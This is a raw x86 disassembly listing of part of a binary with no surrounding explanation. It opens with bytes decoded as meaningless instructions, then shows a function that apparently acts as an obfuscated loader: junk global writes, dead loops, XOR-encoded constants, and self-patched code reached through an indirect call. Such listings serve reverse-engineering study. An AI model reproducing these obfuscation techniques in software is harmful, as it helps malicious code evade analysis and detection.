  40e608:	xchg   BYTE PTR [ecx+0x72],dh
  40e60b:	pandn  mm4,QWORD PTR [eax-0x5f]
  40e60f:	popa   
  40e610:	pop    edx
  40e611:	scas   al,BYTE PTR es:[edi]
  40e612:	sub    ebx,esp
  40e614:	jnp    0x40e5a9
  40e616:	and    DWORD PTR [ecx+0x498f68da],esp
  40e61c:	xor    al,0x2a
  40e61e:	push   cs
  40e61f:	cmp    dh,ah
  40e621:	inc    eax
  40e622:	mov    ds:0xafaa031d,eax
  40e627:	bound  edi,QWORD PTR [edx+0x1]
  40e62a:	adc    eax,0x1929438d
  40e62f:	inc    edi
  40e630:	pop    esp
  40e631:	xor    al,0x3f
  40e633:	push   ebp
  40e634:	add    eax,0x5928999f
  40e639:	fs pop edi
  40e63b:	inc    edx
  40e63c:	mov    edx,0x6ce78016
  40e641:	stos   DWORD PTR es:[edi],eax
  40e642:	pop    esp
  40e643:	fbstp  TBYTE PTR [edi]
  40e645:	cmp    dl,BYTE PTR [esp+edx*2+0x7d4a4468]
  40e64c:	mov    esp,esi
  40e64e:	loope  0x40e67b
  40e650:	xor    DWORD PTR [esi+0x393e7485],0xffffffe9
  40e657:	cmp    esi,esp
  40e659:	add    eax,0x24dd5bcb
  40e65e:	add    al,0xd9
  40e660:	lds    ebx,FWORD PTR [esi]
  40e662:	outs   dx,BYTE PTR ds:[esi]
  40e663:	add    eax,0x1b61f81c
  40e668:	fldenv [edx-0x61451572]
  40e66e:	dec    ecx
  40e66f:	test   eax,0xf5008cd1
  40e674:	or     eax,edx
  40e676:	sub    DWORD PTR [edi-0x2f],esp
  40e679:	jmp    0x40e6b3
  40e67b:	test   DWORD PTR [esi+eiz*1+0x30eed63b],0xccb0d9a
  40e686:	jne    0x40e6c3
  40e688:	xor    esi,esi
  40e68a:	push   0x10
  40e68c:	nop
  40e68d:	es mov bl,0xc1
  40e690:	out    0xf6,al
  40e692:	int3   
  40e693:	pushf  
  40e694:	daa    
  40e695:	mov    cl,0x6e
  40e697:	imul   edi,ebp,0x1e9c0d37
  40e69d:	and    DWORD PTR [eax+0x26],edi
  40e6a0:	retf   
  40e6a1:	pop    edi
  40e6a2:	je     0x40e62d
  40e6a4:	cmp    bh,BYTE PTR [ecx-0x3914eb37]
  40e6aa:	pop    ss
  40e6ab:	out    0x66,al
  40e6ad:	mov    cl,0xe9
  40e6af:	cld    
  40e6b0:	mov    ?,WORD PTR [edx+eiz*2+0x5a]
  40e6b4:	pop    edi
  40e6b5:	cmp    edi,DWORD PTR [eax-0x3d]
  40e6b8:	ins    BYTE PTR es:[edi],dx
  40e6b9:	call   0xb425152c
  40e6be:	adc    bl,bh
  40e6c0:	add    BYTE PTR [ecx],0xe
  40e6c3:	fild   WORD PTR [ebx+eiz*1-0x58]
  40e6c7:	fcom   st(4)
  40e6c9:	pop    edi
  40e6ca:	leave  
  40e6cb:	ret    0x8
  40e6ce:	push   ebp
  40e6cf:	mov    ebp,esp
  40e6d1:	sub    esp,0xa8
  40e6d7:	sbb    DWORD PTR ds:0x434713,0x1bda
  40e6e1:	push   ebx
  40e6e2:	sbb    DWORD PTR ds:0x4346c3,0x5a23
  40e6ec:	push   esi
  40e6ed:	inc    DWORD PTR ds:0x434647
  40e6f3:	push   edi
  40e6f4:	and    DWORD PTR ds:0x43463b,0x6624
  40e6fe:	push   0x414c56
  40e703:	adc    DWORD PTR ds:0x434603,0x6b43
  40e70d:	call   DWORD PTR ds:0x41340c
  40e713:	test   eax,eax
  40e715:	mov    DWORD PTR ds:0x434637,0x267
  40e71f:	je     0x40e741
  40e725:	adc    DWORD PTR ds:0x4346c7,0x4345df
  40e72f:	xor    eax,eax
  40e731:	inc    eax
  40e732:	mov    DWORD PTR ds:0x4345eb,0x5274
  40e73c:	jmp    0x40f150
  40e741:	add    DWORD PTR ds:0x43463b,ecx
  40e747:	mov    DWORD PTR [ebp-0x24],0xf89c8536
  40e74e:	and    DWORD PTR ds:0x4346d3,0x0
  40e758:	jmp    0x40e76a
  40e75d:	mov    edi,DWORD PTR ds:0x4346d3
  40e763:	inc    edi
  40e764:	mov    DWORD PTR ds:0x4346d3,edi
  40e76a:	cmp    DWORD PTR ds:0x4346d3,0x16
  40e771:	jae    0x40e855
  40e777:	cmp    DWORD PTR ds:0x4346d3,0xd
  40e77e:	jne    0x40e79e
  40e784:	push   0x4345eb
  40e789:	push   0x6202
  40e78e:	push   0x434788
  40e793:	push   0x434871
  40e798:	call   DWORD PTR ds:0x413344
  40e79e:	cmp    DWORD PTR ds:0x4346d3,0xc
  40e7a5:	jne    0x40e7b8
  40e7ab:	mov    edi,DWORD PTR ds:0x4346d3
  40e7b1:	inc    edi
  40e7b2:	mov    DWORD PTR ds:0x4346d3,edi
  40e7b8:	jmp    0x40e75d
  40e7bd:	and    DWORD PTR ds:0x43467b,0x0
  40e7c7:	jmp    0x40e7d9
  40e7cc:	mov    edi,DWORD PTR ds:0x43467b
  40e7d2:	inc    edi
  40e7d3:	mov    DWORD PTR ds:0x43467b,edi
  40e7d9:	cmp    DWORD PTR ds:0x43467b,0x11
  40e7e0:	jae    0x40e855
  40e7e6:	cmp    DWORD PTR ds:0x43467b,0x1c
  40e7ed:	jne    0x40e806
  40e7f3:	push   0x43491f
  40e7f8:	push   DWORD PTR [ebp-0x24]
  40e7fb:	push   0x501d
  40e800:	call   DWORD PTR ds:0x413348
  40e806:	jmp    0x40e7cc
  40e80b:	mov    DWORD PTR ds:0x43463b,0x17
  40e815:	cmp    DWORD PTR ds:0x43463b,0x0
  40e81c:	je     0x40e855
  40e822:	cmp    DWORD PTR ds:0x43463b,0x24
  40e829:	jne    0x40e83d
  40e82f:	push   0x3379
  40e834:	push   DWORD PTR [ebp-0x24]
  40e837:	call   DWORD PTR ds:0x4130c8
  40e83d:	mov    ecx,DWORD PTR ds:0x43463b
  40e843:	dec    ecx
  40e844:	mov    DWORD PTR ds:0x43463b,ecx
  40e84a:	jmp    0x40e815
  40e84f:	sub    DWORD PTR ds:0x43468b,edx
  40e855:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  40e85c:	sbb    DWORD PTR ds:0x4346bf,0x434607
  40e866:	lea    eax,[ebp-0x2c]
  40e869:	movzx  ecx,BYTE PTR ds:0x4345f3
  40e870:	and    ecx,DWORD PTR ds:0x4346cf
  40e876:	mov    DWORD PTR ds:0x4345f3,ecx
  40e87c:	mov    DWORD PTR [ebp-0x18],eax
  40e87f:	mov    DWORD PTR ds:0x434647,0x13
  40e889:	cmp    DWORD PTR ds:0x434647,0x0
  40e890:	je     0x40e94f
  40e896:	cmp    DWORD PTR ds:0x434647,0x3
  40e89d:	jne    0x40e8b6
  40e8a3:	push   0x8243
  40e8a8:	push   0x5b51
  40e8ad:	push   DWORD PTR [ebp-0x18]
  40e8b0:	call   DWORD PTR ds:0x4130cc
  40e8b6:	cmp    DWORD PTR ds:0x434647,0x4
  40e8bd:	jne    0x40e8d0
  40e8c3:	mov    esi,DWORD PTR ds:0x434647
  40e8c9:	dec    esi
  40e8ca:	mov    DWORD PTR ds:0x434647,esi
  40e8d0:	xor    esi,esi
  40e8d2:	add    esi,DWORD PTR ds:0x434647
  40e8d8:	dec    esi
  40e8d9:	mov    DWORD PTR ds:0x434647,esi
  40e8df:	jmp    0x40e889
  40e8e4:	and    DWORD PTR ds:0x43467b,0x0
  40e8ee:	jmp    0x40e900
  40e8f3:	mov    edi,DWORD PTR ds:0x43467b
  40e8f9:	inc    edi
  40e8fa:	mov    DWORD PTR ds:0x43467b,edi
  40e900:	cmp    DWORD PTR ds:0x43467b,0x19
  40e907:	jae    0x40e94f
  40e90d:	cmp    DWORD PTR ds:0x43467b,0xd
  40e914:	jne    0x40e92a
  40e91a:	push   0x6845
  40e91f:	push   0x4347f3
  40e924:	call   DWORD PTR ds:0x41334c
  40e92a:	cmp    DWORD PTR ds:0x43467b,0xc
  40e931:	jne    0x40e944
  40e937:	mov    edi,DWORD PTR ds:0x43467b
  40e93d:	inc    edi
  40e93e:	mov    DWORD PTR ds:0x43467b,edi
  40e944:	jmp    0x40e8f3
  40e949:	sub    DWORD PTR ds:0x43463f,edi
  40e94f:	lea    eax,[ebp-0x30]
  40e952:	mov    ecx,DWORD PTR ds:0x434687
  40e958:	adc    DWORD PTR ds:0x4346b7,ecx
  40e95e:	mov    DWORD PTR [ebp-0x14],eax
  40e961:	mov    esi,DWORD PTR ds:0x43461b
  40e967:	xor    ecx,ecx
  40e969:	or     ecx,DWORD PTR ds:0x434657
  40e96f:	sub    esi,ecx
  40e971:	or     esi,DWORD PTR [esi+ecx*1]
  40e974:	mov    eax,ds:0x414afe
  40e979:	mov    ebx,DWORD PTR ds:0x4346b3
  40e97f:	mov    ebx,DWORD PTR [ebx]
  40e981:	sub    DWORD PTR ds:0x4345ff,ebx
  40e987:	mov    eax,DWORD PTR [eax+0x1c8]
  40e98d:	mov    eax,DWORD PTR [eax]
  40e98f:	or     edi,0x2360
  40e995:	mov    ecx,DWORD PTR [ebp-0x14]
  40e998:	mov    esi,0x7510851
  40e99d:	and    DWORD PTR ds:0x434647,0x6472
  40e9a7:	xor    eax,esi
  40e9a9:	sbb    edi,DWORD PTR ds:0x4345fb
  40e9af:	mov    edi,0x327299
  40e9b4:	xor    DWORD PTR ds:0x4345fb,ebx
  40e9ba:	add    eax,edi
  40e9bc:	mov    DWORD PTR [ecx],eax
  40e9be:	mov    eax,ds:0x414dae
  40e9c3:	movzx  ebx,WORD PTR ds:0x4346f7
  40e9ca:	cmp    eax,0x22c02f45
  40e9cf:	mov    eax,DWORD PTR [ebp-0x4]
  40e9d2:	movzx  ebx,BYTE PTR ds:0x4346c7
  40e9d9:	mov    ebx,0xf89c853a
  40e9de:	je     0x40ea1a
  40e9e4:	sub    DWORD PTR ds:0x4346ff,edi
  40e9ea:	mov    ecx,DWORD PTR [ebp-0x24]
  40e9ed:	xor    eax,esi
  40e9ef:	add    eax,edi
  40e9f1:	sbb    DWORD PTR ds:0x434703,0x3fff
  40e9fb:	imul   eax,ecx
  40e9fe:	mov    DWORD PTR ds:0x4345f7,0x22e4
  40ea08:	mov    DWORD PTR [ebp-0x24],eax
  40ea0b:	mov    DWORD PTR ds:0x434647,0x3208
  40ea15:	jmp    0x40eab6
  40ea1a:	add    DWORD PTR ds:0x4346bf,0x154a
  40ea24:	xor    eax,esi
  40ea26:	sbb    DWORD PTR ds:0x434647,0x7bc1
  40ea30:	add    eax,edi
  40ea32:	mov    ds:0x414c12,eax
  40ea37:	movzx  eax,BYTE PTR ds:0x4346bb
  40ea3e:	sub    DWORD PTR ds:0x4346bf,eax
  40ea44:	mov    eax,DWORD PTR [ebp-0x24]
  40ea47:	xor    eax,esi
  40ea49:	adc    DWORD PTR ds:0x43468f,ebx
  40ea4f:	add    eax,edi
  40ea51:	not    ecx
  40ea53:	mov    ds:0x414dae,eax
  40ea58:	mov    eax,DWORD PTR [ebp-0x4]
  40ea5b:	mov    ecx,DWORD PTR ds:0x414c12
  40ea61:	xor    eax,esi
  40ea63:	xor    DWORD PTR ds:0x434603,0x4346c3
  40ea6d:	add    eax,edi
  40ea6f:	mov    DWORD PTR ds:0x43468b,0x4a46
  40ea79:	cmp    ecx,eax
  40ea7b:	jne    0x40eab6
  40ea81:	sbb    DWORD PTR ds:0x434603,0x43464f
  40ea8b:	push   ebx
  40ea8c:	mov    DWORD PTR ds:0x4346bf,0x49e8
  40ea96:	push   DWORD PTR [ebp-0x4]
  40ea99:	sbb    DWORD PTR ds:0x43463f,0x7dd1
  40eaa3:	push   DWORD PTR [ebp-0x24]
  40eaa6:	adc    DWORD PTR ds:0x4345ef,0x434603
  40eab0:	call   DWORD PTR ds:0x414c0a
  40eab6:	and    edx,DWORD PTR ds:0x434603
  40eabc:	mov    eax,ds:0x414afe
  40eac1:	mov    ecx,DWORD PTR ds:0x434693
  40eac7:	and    DWORD PTR ds:0x434643,ecx
  40eacd:	mov    eax,DWORD PTR [eax+0x18c]
  40ead3:	sub    ecx,edx
  40ead5:	mov    eax,DWORD PTR [eax]
  40ead7:	neg    ecx
  40ead9:	mov    DWORD PTR [ebp-0x44],eax
  40eadc:	mov    DWORD PTR [ebp-0x10],ebx
  40eadf:	sub    ecx,DWORD PTR ds:0x43470f
  40eae5:	mov    DWORD PTR [ebp-0x10],ebx
  40eae8:	and    DWORD PTR ds:0x43463f,0x0
  40eaf2:	jmp    0x40eb04
  40eaf7:	mov    ecx,DWORD PTR ds:0x43463f
  40eafd:	inc    ecx
  40eafe:	mov    DWORD PTR ds:0x43463f,ecx
  40eb04:	cmp    DWORD PTR ds:0x43463f,0x1d
  40eb0b:	jae    0x40eb61
  40eb11:	cmp    DWORD PTR ds:0x43463f,0x7
  40eb18:	jne    0x40eb2c
  40eb1e:	push   DWORD PTR [ebp-0x18]
  40eb21:	push   0x7577
  40eb26:	call   DWORD PTR ds:0x4130d0
  40eb2c:	cmp    DWORD PTR ds:0x43463f,0x6
  40eb33:	jne    0x40eb48
  40eb39:	xor    ecx,ecx
  40eb3b:	add    ecx,DWORD PTR ds:0x43463f
  40eb41:	inc    ecx
  40eb42:	mov    DWORD PTR ds:0x43463f,ecx
  40eb48:	jmp    0x40eaf7
  40eb4d:	xor    edx,edx
  40eb4f:	or     edx,DWORD PTR ds:0x434647
  40eb55:	sbb    edx,DWORD PTR ds:0x434707
  40eb5b:	mov    DWORD PTR ds:0x434647,edx
  40eb61:	mov    DWORD PTR [ebp-0x10],ebx
  40eb64:	mov    ecx,DWORD PTR ds:0x43470b
  40eb6a:	or     DWORD PTR ds:0x4346bb,ecx
  40eb70:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  40eb77:	or     eax,edx
  40eb79:	mov    DWORD PTR [ebp-0x10],ebx
  40eb7c:	mov    DWORD PTR [ebp-0x10],0xf89c853e
  40eb83:	xor    ecx,DWORD PTR ds:0x434637
  40eb89:	mov    eax,DWORD PTR [ebp-0x24]
  40eb8c:	and    edx,0x522c
  40eb92:	mov    ecx,DWORD PTR [ebp-0x4]
  40eb95:	and    DWORD PTR ds:0x43470f,edx
  40eb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40eb9e:	or     DWORD PTR ds:0x43470b,0x4346c7
  40eba8:	xor    edx,esi
  40ebaa:	sub    DWORD PTR ds:0x43464f,0x434607
  40ebb4:	xor    ecx,esi
  40ebb6:	adc    DWORD PTR ds:0x4346bf,0x4346fb
  40ebc0:	add    ecx,edx
  40ebc2:	mov    edx,DWORD PTR [ebp-0x4]
  40ebc5:	adc    DWORD PTR ds:0x4345f7,0x434677
  40ebcf:	xor    eax,esi
  40ebd1:	xor    edx,esi
  40ebd3:	adc    DWORD PTR ds:0x4345e3,0x6faf
  40ebdd:	add    eax,edi
  40ebdf:	mov    DWORD PTR ds:0x434683,0x13
  40ebe9:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ebf0:	mov    DWORD PTR ds:0x43463b,0x74ca
  40ebfa:	mov    DWORD PTR [ebp-0x20],eax
  40ebfd:	mov    DWORD PTR ds:0x434643,0x777a
  40ec07:	cmp    eax,ecx
  40ec09:	mov    DWORD PTR ds:0x434713,0x6f86
  40ec13:	ja     0x40ed7b
  40ec19:	jmp    0x40ec27
  40ec1e:	adc    DWORD PTR ds:0x43467b,edi
  40ec24:	mov    eax,DWORD PTR [ebp-0x20]
  40ec27:	add    DWORD PTR ds:0x434703,0x32bd
  40ec31:	mov    ecx,DWORD PTR [ebp-0x4]
  40ec34:	xor    ecx,esi
  40ec36:	xor    DWORD PTR ds:0x4345e7,0x43468f
  40ec40:	lea    eax,[ecx+eax*1+0x327299]
  40ec47:	push   eax
  40ec48:	and    DWORD PTR ds:0x434693,0x0
  40ec52:	xor    eax,eax
  40ec54:	or     eax,DWORD PTR ds:0x434693
  40ec5a:	inc    eax
  40ec5b:	mov    ds:0x434693,eax
  40ec60:	cmp    DWORD PTR ds:0x434693,0x10
  40ec67:	jne    0x40ec76
  40ec6d:	push   DWORD PTR [ebp-0x1c]
  40ec70:	call   DWORD PTR ds:0x413350
  40ec76:	cmp    DWORD PTR ds:0x434693,0xf
  40ec7d:	jne    0x40ec91
  40ec83:	xor    eax,eax
  40ec85:	add    eax,DWORD PTR ds:0x434693
  40ec8b:	inc    eax
  40ec8c:	mov    ds:0x434693,eax
  40ec91:	cmp    DWORD PTR ds:0x434693,0x1c
  40ec98:	jb     0x40ec52
  40ec9e:	movzx  eax,BYTE PTR ds:0x4345e3
  40eca5:	adc    eax,DWORD PTR ds:0x43467b
  40ecab:	mov    ds:0x4345e3,eax
  40ecb0:	mov    eax,DWORD PTR [ebp-0x14]
  40ecb3:	xor    eax,esi
  40ecb5:	mov    DWORD PTR ds:0x43463f,0x3b17
  40ecbf:	lea    eax,[ebp+eax*1+0x3272a1]
  40ecc6:	sub    DWORD PTR ds:0x4346f7,0x434603
  40ecd0:	push   eax
  40ecd1:	and    eax,DWORD PTR ds:0x43467b
  40ecd7:	mov    eax,ds:0x414afe
  40ecdc:	adc    DWORD PTR ds:0x434637,0x7c2
  40ece6:	push   DWORD PTR [eax+0x1bc]
  40ecec:	call   0x4028d7
  40ecf1:	mov    eax,DWORD PTR [ebp-0x4]
  40ecf4:	mov    ecx,DWORD PTR [ebp-0x20]
  40ecf7:	mov    edx,DWORD PTR ds:0x4346fb
  40ecfd:	or     DWORD PTR ds:0x434713,edx
  40ed03:	xor    eax,esi
  40ed05:	lea    eax,[ecx+eax*1+0x327299]
  40ed0c:	mov    ecx,DWORD PTR [ebp-0x4]
  40ed0f:	or     DWORD PTR ds:0x434643,edi
  40ed15:	mov    edx,DWORD PTR [ebp-0x4]
  40ed18:	sub    DWORD PTR ds:0x434677,0x283f
  40ed22:	xor    edx,esi
  40ed24:	xor    DWORD PTR ds:0x4346d3,0x434637
  40ed2e:	xor    ecx,esi
  40ed30:	add    ecx,edx
  40ed32:	mov    edx,DWORD PTR [ebp-0x4]
  40ed35:	and    DWORD PTR ds:0x4346f7,0x4345ff
  40ed3f:	xor    edx,esi
  40ed41:	mov    DWORD PTR ds:0x434637,0x5401
  40ed4b:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ed52:	mov    DWORD PTR ds:0x434607,0x25c8
  40ed5c:	mov    DWORD PTR [ebp-0x20],eax
  40ed5f:	mov    DWORD PTR ds:0x43463f,0x56d4
  40ed69:	cmp    eax,ecx
  40ed6b:	mov    DWORD PTR ds:0x434607,0x74b6
  40ed75:	jbe    0x40ec1e
  40ed7b:	mov    DWORD PTR ds:0x4346ff,0x4be2
  40ed85:	mov    eax,DWORD PTR [ebp+0xc]
  40ed88:	add    DWORD PTR ds:0x434707,edx
  40ed8e:	mov    ds:0x414982,eax
  40ed93:	mov    eax,DWORD PTR [ebp+0x10]
  40ed96:	mov    ds:0x414bd6,eax
  40ed9b:	and    DWORD PTR ds:0x4346c7,0x0
  40eda5:	mov    ecx,DWORD PTR ds:0x4346c7
  40edab:	inc    ecx
  40edac:	mov    DWORD PTR ds:0x4346c7,ecx
  40edb2:	cmp    DWORD PTR ds:0x4346c7,0x1f
  40edb9:	jne    0x40edca
  40edbf:	push   0x43495b
  40edc4:	call   DWORD PTR ds:0x413354
  40edca:	cmp    DWORD PTR ds:0x4346c7,0x13
  40edd1:	jb     0x40eda5
  40edd7:	add    ecx,eax
  40edd9:	mov    eax,ds:0x414982
  40edde:	inc    ecx
  40eddf:	mov    ecx,DWORD PTR [ebp-0x18]
  40ede2:	sub    DWORD PTR ds:0x43464f,0x1b10
  40edec:	push   DWORD PTR [ebp-0x44]
  40edef:	or     DWORD PTR ds:0x4346c3,0x4346f7
  40edf9:	sub    eax,edi
  40edfb:	sub    DWORD PTR ds:0x4345ff,0x4345ef
  40ee05:	push   DWORD PTR [ebp-0x30]
  40ee08:	adc    DWORD PTR ds:0x43463b,0x5064
  40ee12:	xor    eax,esi
  40ee14:	mov    DWORD PTR [ecx],eax
  40ee16:	push   DWORD PTR [ebp-0x2c]
  40ee19:	call   0x40f157
  40ee1e:	sub    eax,edi
  40ee20:	adc    ecx,DWORD PTR ds:0x4345ef
  40ee26:	xor    eax,esi
  40ee28:	mov    DWORD PTR ds:0x4345ff,0x13
  40ee32:	cmp    DWORD PTR ds:0x4345ff,0x0
  40ee39:	je     0x40ee7a
  40ee3f:	cmp    DWORD PTR ds:0x4345ff,0x18
  40ee46:	jne    0x40ee68
  40ee4c:	push   0x43495b
  40ee51:	push   DWORD PTR [ebp-0xc]
  40ee54:	push   DWORD PTR [ebp-0x28]
  40ee57:	push   DWORD PTR [ebp-0x1c]
  40ee5a:	push   DWORD PTR [ebp-0x20]
  40ee5d:	push   0x2408
  40ee62:	call   DWORD PTR ds:0x413358
  40ee68:	mov    ecx,DWORD PTR ds:0x4345ff
  40ee6e:	dec    ecx
  40ee6f:	mov    DWORD PTR ds:0x4345ff,ecx
  40ee75:	jmp    0x40ee32
  40ee7a:	mov    DWORD PTR [ebp+0xc],eax
  40ee7d:	mov    ecx,DWORD PTR [ebp-0x4]
  40ee80:	mov    eax,DWORD PTR [ebp+0xc]
  40ee83:	xor    ecx,esi
  40ee85:	add    ecx,edi
  40ee87:	xor    edx,edx
  40ee89:	div    ecx
  40ee8b:	mov    ecx,DWORD PTR [ebp-0x24]
  40ee8e:	cmp    ecx,eax
  40ee90:	jne    0x40f0b9
  40ee96:	mov    eax,ds:0x414afe
  40ee9b:	mov    DWORD PTR [ebp+0x10],eax
  40ee9e:	mov    eax,ds:0x414c0e
  40eea3:	mov    DWORD PTR [ebp-0x50],eax
  40eea6:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40eead:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40eeb4:	mov    DWORD PTR [ebp-0x4c],0xf89cb536
  40eebb:	mov    DWORD PTR [ebp-0x64],0xf89f0536
  40eec2:	mov    DWORD PTR [ebp-0x60],0xf89c85f6
  40eec9:	mov    DWORD PTR [ebp-0x54],0xf89c85d6
  40eed0:	mov    eax,DWORD PTR [ebp-0x18]
  40eed3:	xor    eax,esi
  40eed5:	add    eax,edi
  40eed7:	mov    DWORD PTR [ebp-0xc],eax
  40eeda:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  40eee1:	mov    BYTE PTR [ebp-0x25],0x67
  40eee5:	mov    eax,DWORD PTR [ebp-0x18]
  40eee8:	xor    eax,esi
  40eeea:	add    eax,edi
  40eeec:	mov    DWORD PTR [ebp-0xc],eax
  40eeef:	mov    eax,DWORD PTR [ebp-0x54]
  40eef2:	xor    eax,esi
  40eef4:	add    eax,edi
  40eef6:	mov    DWORD PTR [ebp-0x40],eax
  40eef9:	mov    eax,DWORD PTR [ebp-0x4c]
  40eefc:	xor    eax,esi
  40eefe:	add    eax,edi
  40ef00:	mov    DWORD PTR [ebp-0x38],eax
  40ef03:	mov    eax,DWORD PTR [ebp-0x3c]
  40ef06:	xor    eax,esi
  40ef08:	add    eax,edi
  40ef0a:	mov    DWORD PTR [ebp-0x34],eax
  40ef0d:	lea    eax,[ebp-0xa8]
  40ef13:	mov    DWORD PTR [ebp+0xc],eax
  40ef16:	mov    eax,DWORD PTR [ebp-0x18]
  40ef19:	mov    DWORD PTR [ebp-0x14],eax
  40ef1c:	mov    eax,DWORD PTR [ebp-0x20]
  40ef1f:	mov    DWORD PTR [ebp-0x5c],ebx
  40ef22:	mov    DWORD PTR [ebp-0x10],eax
  40ef25:	mov    eax,DWORD PTR [ebp-0x5c]
  40ef28:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef2b:	xor    eax,esi
  40ef2d:	add    eax,0x327299
  40ef32:	mov    DWORD PTR [ecx],eax
  40ef34:	mov    eax,DWORD PTR [ebp-0x14]
  40ef37:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef3a:	xor    eax,esi
  40ef3c:	add    eax,edi
  40ef3e:	mov    DWORD PTR [ecx+0x4],eax
  40ef41:	mov    eax,DWORD PTR [ebp-0x34]
  40ef44:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef47:	mov    DWORD PTR [ecx+0x8],eax
  40ef4a:	mov    eax,DWORD PTR [ebp-0x38]
  40ef4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef50:	mov    DWORD PTR [ecx+0xc],eax
  40ef53:	mov    eax,DWORD PTR [ebp-0x40]
  40ef56:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef59:	mov    DWORD PTR [ecx+0x10],eax
  40ef5c:	mov    eax,eax
  40ef5e:	mov    eax,DWORD PTR [ebp-0x10]
  40ef61:	xor    eax,esi
  40ef63:	add    eax,edi
  40ef65:	je     0x40ef96
  40ef6b:	lea    eax,[ebp-0xa8]
  40ef71:	push   eax
  40ef72:	mov    eax,DWORD PTR [ebp-0x20]
  40ef75:	xor    eax,esi
  40ef77:	add    eax,edi
  40ef79:	push   eax
  40ef7a:	mov    eax,DWORD PTR [ebp+0x10]
  40ef7d:	add    eax,0xaa
  40ef82:	push   eax
  40ef83:	mov    eax,DWORD PTR [ebp+0x10]
  40ef86:	mov    eax,DWORD PTR [eax+0x198]
  40ef8c:	push   DWORD PTR [eax]
  40ef8e:	call   0x411333
  40ef93:	mov    DWORD PTR [ebp-0x8],eax
  40ef96:	cmp    DWORD PTR [ebp-0x8],0x0
  40ef9a:	je     0x40f0b9
  40efa0:	lea    eax,[ebp-0xc]
  40efa3:	mov    DWORD PTR [ebp-0x38],eax
  40efa6:	mov    eax,DWORD PTR [ebp-0x60]
  40efa9:	xor    eax,esi
  40efab:	add    eax,edi
  40efad:	mov    DWORD PTR [ebp-0x40],eax
  40efb0:	mov    eax,DWORD PTR [ebp-0x3c]
  40efb3:	xor    eax,esi
  40efb5:	add    eax,edi
  40efb7:	mov    DWORD PTR [ebp-0x10],eax
  40efba:	mov    eax,DWORD PTR [ebp-0x8]
  40efbd:	mov    DWORD PTR [ebp-0x14],eax
  40efc0:	lea    eax,[ebp-0xa8]
  40efc6:	mov    DWORD PTR [ebp+0xc],eax
  40efc9:	mov    eax,DWORD PTR [ebp-0x18]
  40efcc:	mov    DWORD PTR [ebp-0x18],eax
  40efcf:	mov    eax,DWORD PTR [ebp-0x20]
  40efd2:	mov    DWORD PTR [ebp-0x48],ebx
  40efd5:	mov    DWORD PTR [ebp-0x34],eax
  40efd8:	mov    eax,DWORD PTR [ebp-0x48]
  40efdb:	mov    ecx,DWORD PTR [ebp+0xc]
  40efde:	xor    eax,esi
  40efe0:	add    eax,0x327299
  40efe5:	mov    DWORD PTR [ecx],eax
  40efe7:	mov    eax,DWORD PTR [ebp-0x14]
  40efea:	mov    ecx,DWORD PTR [ebp+0xc]
  40efed:	mov    DWORD PTR [ecx+0x4],eax
  40eff0:	mov    eax,DWORD PTR [ebp-0x10]
  40eff3:	mov    ecx,DWORD PTR [ebp+0xc]
  40eff6:	mov    DWORD PTR [ecx+0x8],eax
  40eff9:	mov    eax,DWORD PTR [ebp-0x40]
  40effc:	mov    ecx,DWORD PTR [ebp+0xc]
  40efff:	mov    DWORD PTR [ecx+0xc],eax
  40f002:	mov    eax,DWORD PTR [ebp-0x38]
  40f005:	mov    ecx,DWORD PTR [ebp+0xc]
  40f008:	mov    DWORD PTR [ecx+0x10],eax
  40f00b:	mov    eax,eax
  40f00d:	mov    eax,DWORD PTR [ebp-0x14]
  40f010:	test   eax,eax
  40f012:	mov    eax,DWORD PTR [ebp-0x34]
  40f015:	jne    0x40f01e
  40f01b:	mov    eax,DWORD PTR [ebp-0x18]
  40f01e:	xor    eax,esi
  40f020:	add    eax,edi
  40f022:	test   eax,eax
  40f024:	je     0x40f052
  40f02a:	lea    eax,[ebp-0xa8]
  40f030:	push   eax
  40f031:	mov    eax,DWORD PTR [ebp-0x20]
  40f034:	xor    eax,esi
  40f036:	add    eax,edi
  40f038:	push   eax
  40f039:	mov    eax,DWORD PTR [ebp+0x10]
  40f03c:	add    eax,0xee
  40f041:	push   eax
  40f042:	mov    eax,DWORD PTR [ebp+0x10]
  40f045:	mov    eax,DWORD PTR [eax+0x198]
  40f04b:	push   DWORD PTR [eax]
  40f04d:	call   0x411333
  40f052:	mov    ecx,DWORD PTR [ebp-0x3c]
  40f055:	xor    ecx,esi
  40f057:	mov    eax,0xffcd8d67
  40f05c:	sub    eax,ecx
  40f05e:	sub    eax,DWORD PTR [ebp-0x8]
  40f061:	mov    ecx,DWORD PTR [ebp-0x50]
  40f064:	add    ecx,eax
  40f066:	mov    eax,DWORD PTR [ebp-0x8]
  40f069:	mov    DWORD PTR [eax+0x1],ecx
  40f06c:	mov    al,BYTE PTR [ebp-0x25]
  40f06f:	mov    ecx,DWORD PTR [ebp-0x8]
  40f072:	xor    al,0x44
  40f074:	sub    al,0x3a
  40f076:	mov    BYTE PTR [ecx],al
  40f078:	lea    eax,[ebp-0x8]
  40f07b:	inc    BYTE PTR [eax]
  40f07d:	inc    eax
  40f07e:	push   eax
  40f07f:	pop    ecx
  40f080:	dec    ecx
  40f081:	xchg   ecx,edx
  40f083:	dec    BYTE PTR [edx]
  40f085:	push   DWORD PTR [ebp+0x10]
  40f088:	mov    eax,ds:0x414bba
  40f08d:	mov    eax,DWORD PTR [eax]
  40f08f:	push   DWORD PTR [eax]
  40f091:	lea    eax,ds:0x414bd6
  40f097:	push   DWORD PTR [eax]
  40f099:	lea    eax,ds:0x414982
  40f09f:	push   DWORD PTR [eax]
  40f0a1:	lea    eax,ds:0x414bb6
  40f0a7:	push   DWORD PTR [eax]
  40f0a9:	lea    eax,ds:0x414cda
  40f0af:	push   DWORD PTR [eax]
  40f0b1:	xchg   ebx,edx
  40f0b3:	inc    ebx
  40f0b4:	push   ebx
  40f0b5:	pop    eax
  40f0b6:	call   DWORD PTR [eax-0x1]
  40f0b9:	lea    eax,[ebp+0x4]
